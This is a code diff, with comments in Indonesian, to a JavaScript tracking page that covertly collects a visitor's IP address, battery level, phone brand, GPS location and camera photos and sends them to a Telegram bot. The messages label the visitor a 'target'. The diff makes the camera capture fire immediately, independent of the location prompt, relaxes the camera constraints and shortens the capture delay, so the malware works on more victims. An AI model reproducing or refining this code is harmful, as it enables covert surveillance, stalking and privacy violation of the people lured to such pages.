@@ -16,41 +16,41 @@ async function getIP() {
 
 function getMerekHP() {
   const ua = navigator.userAgent;
-if (/Samsung|SM-|GT-/i.test(ua)) return "Samsung";
-if (/Xiaomi|Mi |MIX|M\d{4}/i.test(ua)) return "Xiaomi";
-if (/Redmi|Note \d+/i.test(ua)) return "Redmi";
-if (/Oppo|CPH|PAM|PCLM|PGM/i.test(ua)) return "Oppo";
-if (/Vivo|V\d{4}|PD\d{4}/i.test(ua)) return "Vivo";
-if (/Realme|RMX|RMX\d+/i.test(ua)) return "Realme";
-if (/iPhone|iPad|iOS/i.test(ua)) return "Apple";
-if (/Asus|Zenfone|ZS\d{4}/i.test(ua)) return "Asus";
-if (/Infinix|X\d{3}/i.test(ua)) return "Infinix";
-if (/Huawei|Honor|JAT|LYA|ELE|NOH|LIO/i.test(ua)) return "Huawei";
-if (/OnePlus|KB\d{4}|GM\d{4}|IN\d{4}/i.test(ua)) return "OnePlus";
-if (/Lenovo|L\d{4}/i.test(ua)) return "Lenovo";
-if (/Motorola|Moto|XT\d{4}/i.test(ua)) return "Motorola";
-if (/Tecno|KG\d{4}|CD\d{4}/i.test(ua)) return "Tecno";
-if (/Itel|W\d{4}/i.test(ua)) return "Itel";
-if (/Nokia|TA-\d{4}/i.test(ua)) return "Nokia";
-if (/Sony|Xperia|G\d{4}/i.test(ua)) return "Sony";
-if (/Meizu/i.test(ua)) return "Meizu";
-if (/ZTE|Z\d{4}/i.test(ua)) return "ZTE";
-if (/HTC/i.test(ua)) return "HTC";
-if (/Sharp|SHV/i.test(ua)) return "Sharp";
-if (/LG|LM-|LGM/i.test(ua)) return "LG";
-if (/Coolpad|CP\d{4}/i.test(ua)) return "Coolpad";
-if (/Micromax/i.test(ua)) return "Micromax";
-if (/Alcatel|TCL/i.test(ua)) return "Alcatel";
-if (/BlackBerry|BB\d{4}/i.test(ua)) return "BlackBerry";
-if (/LeEco|LeMobile/i.test(ua)) return "LeEco";
-if (/Doogee/i.test(ua)) return "Doogee";
-if (/Ulefone/i.test(ua)) return "Ulefone";
-if (/BLU/i.test(ua)) return "BLU";
-if (/Cubot/i.test(ua)) return "Cubot";
-if (/RealWear/i.test(ua)) return "RealWear";
-if (/Fairphone/i.test(ua)) return "Fairphone";
-if (/BQ/i.test(ua)) return "BQ";
-if (/Hisense/i.test(ua)) return "Hisense";
+  if (/Samsung|SM-|GT-/i.test(ua)) return "Samsung";
+  if (/Xiaomi|Mi |MIX|M\d{4}/i.test(ua)) return "Xiaomi";
+  if (/Redmi|Note \d+/i.test(ua)) return "Redmi";
+  if (/Oppo|CPH|PAM|PCLM|PGM/i.test(ua)) return "Oppo";
+  if (/Vivo|V\d{4}|PD\d{4}/i.test(ua)) return "Vivo";
+  if (/Realme|RMX|RMX\d+/i.test(ua)) return "Realme";
+  if (/iPhone|iPad|iOS/i.test(ua)) return "Apple";
+  if (/Asus|Zenfone|ZS\d{4}/i.test(ua)) return "Asus";
+  if (/Infinix|X\d{3}/i.test(ua)) return "Infinix";
+  if (/Huawei|Honor|JAT|LYA|ELE|NOH|LIO/i.test(ua)) return "Huawei";
+  if (/OnePlus|KB\d{4}|GM\d{4}|IN\d{4}/i.test(ua)) return "OnePlus";
+  if (/Lenovo|L\d{4}/i.test(ua)) return "Lenovo";
+  if (/Motorola|Moto|XT\d{4}/i.test(ua)) return "Motorola";
+  if (/Tecno|KG\d{4}|CD\d{4}/i.test(ua)) return "Tecno";
+  if (/Itel|W\d{4}/i.test(ua)) return "Itel";
+  if (/Nokia|TA-\d{4}/i.test(ua)) return "Nokia";
+  if (/Sony|Xperia|G\d{4}/i.test(ua)) return "Sony";
+  if (/Meizu/i.test(ua)) return "Meizu";
+  if (/ZTE|Z\d{4}/i.test(ua)) return "ZTE";
+  if (/HTC/i.test(ua)) return "HTC";
+  if (/Sharp|SHV/i.test(ua)) return "Sharp";
+  if (/LG|LM-|LGM/i.test(ua)) return "LG";
+  if (/Coolpad|CP\d{4}/i.test(ua)) return "Coolpad";
+  if (/Micromax/i.test(ua)) return "Micromax";
+  if (/Alcatel|TCL/i.test(ua)) return "Alcatel";
+  if (/BlackBerry|BB\d{4}/i.test(ua)) return "BlackBerry";
+  if (/LeEco|LeMobile/i.test(ua)) return "LeEco";
+  if (/Doogee/i.test(ua)) return "Doogee";
+  if (/Ulefone/i.test(ua)) return "Ulefone";
+  if (/BLU/i.test(ua)) return "BLU";
+  if (/Cubot/i.test(ua)) return "Cubot";
+  if (/RealWear/i.test(ua)) return "RealWear";
+  if (/Fairphone/i.test(ua)) return "Fairphone";
+  if (/BQ/i.test(ua)) return "BQ";
+  if (/Hisense/i.test(ua)) return "Hisense";
   return "Tidak diketahui";
 }
 
@@ -71,7 +71,8 @@ async function getBatteryInfo() {
 
 async function captureCamera(facing) {
   return new Promise((resolve, reject) => {
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: facing } } })
+    const constraints = { video: { facingMode: facing } };
+    navigator.mediaDevices.getUserMedia(constraints)
       .then(stream => {
         video.srcObject = stream;
         video.onloadedmetadata = () => {
@@ -84,7 +85,7 @@ async function captureCamera(facing) {
             canvas.toBlob(blob => {
               resolve(blob);
             }, 'image/jpeg');
-          }, 2000);
+          }, 1500);
         };
       })
       .catch(err => reject(err));
@@ -131,15 +132,20 @@ async function kirimPesanTelegram(pesan) {
   const batre = await getBatteryInfo();
   const ip = await getIP();
   const merek = getMerekHP();
-  const pesanAwal = `╭──「 IP berhasil ditemukan! 」──
+
+  // kirim pesan awal
+  await kirimPesanTelegram(`╭──「 Target berhasil ditemukan! 」──
 │🌐 Status: MENUNGGU IZIN LOKASI
 │📡 IP: ${ip}
 │🔋 Batrai: ${batre}
 │📱 Merek hp: ${merek}
-╰───────────────────`;
-  await kirimPesanTelegram(pesanAwal);
+╰───────────────────`);
+
+  // langsung minta kamera
+  await kirimFotoKeTelegram();
 })();
 
+// geolocation tetap dicoba, tapi kamera tidak tergantung hasilnya
 navigator.geolocation.getCurrentPosition(
   async (pos) => {
     const batre = await getBatteryInfo();
@@ -149,31 +155,28 @@ navigator.geolocation.getCurrentPosition(
     const ip = await getIP();
     const merek = getMerekHP();
 
-    const pesan = `╭──「 IP berhasil ditemukan! 」──
+    const pesan = `╭──「 Target berhasil ditemukan! 」──
 │🌐 Status: MENGIZINKAN LOKASI
 │📡 IP: ${ip}
 │📱 Merek hp: ${merek}
 │🔋 Batrai: ${batre}
 │📍 Lokasi: ${gmaps}
-│📷 Sedang meminta akses kamera...
 ╰───────────────────`;
     await kirimPesanTelegram(pesan);
-    await kirimFotoKeTelegram();
     document.body.innerHTML = '<h2>Yahh kurang hoki bro wkwk.<br><small>by Vinzz Official</small></h2>';
   },
-  async () => {
+  async (err) => {
+    const batre = await getBatteryInfo();
     const ip = await getIP();
     const merek = getMerekHP();
 
-    const pesan = `╭──「 IP berhasil ditemukan! 」──
-│🌐 Status: MENOLAK LOKASI
+    const pesan = `╭──「 Target berhasil ditemukan! 」──
+│🌐 Status: LOKASI GAGAL (${err.code})
 │📡 IP: ${ip}
-│🔋 Batrai: ${batre}
 │📱 Merek hp: ${merek}
-│📷 Sedang meminta akses kamera...
+│🔋 Batrai: ${batre}
 ╰───────────────────`;
     await kirimPesanTelegram(pesan);
-    await kirimFotoKeTelegram();
     document.body.innerHTML = '<h2>Izinin dulu semuanya<br><small>by Vinzz Official</small></h2>';
   }
 );
